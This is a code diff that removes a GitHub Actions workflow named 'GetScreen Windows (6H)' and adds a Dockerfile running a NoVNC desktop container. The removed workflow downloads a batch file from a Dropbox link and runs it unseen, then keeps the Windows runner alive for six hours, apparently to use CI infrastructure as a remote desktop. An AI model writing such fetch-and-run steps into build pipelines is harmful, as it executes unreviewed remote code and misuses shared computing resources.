@@ -1,18 +1,11 @@
-name: GetScreen Windows (6H)
-
-on:
-  workflow_dispatch:
-
-jobs:
-  build:
-    runs-on: windows-latest
-
-    steps:
-      - name: Downloading & Setting Up
-        run: |
-         echo "EMAIL_SECRET=duyi.ng.21.4.5@gmail.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1" -OutFile "down.bat"
-         cmd /c down.bat
-
-      - name: Time Counter
-        run: Start-Sleep -Seconds 21600
+# Use the base image
+FROM fredblgr/ubuntu-novnc:20.04
+ 
+# Expose the port on which NoVNC runs (80 inside the container)
+EXPOSE 80
+ 
+# Set the environment variable for screen resolution
+ENV RESOLUTION 1707x1067
+ 
+# Start the command to run NoVNC
+CMD ["supervisord", "-c", "/etc/supervisor/supervisord.conf"]
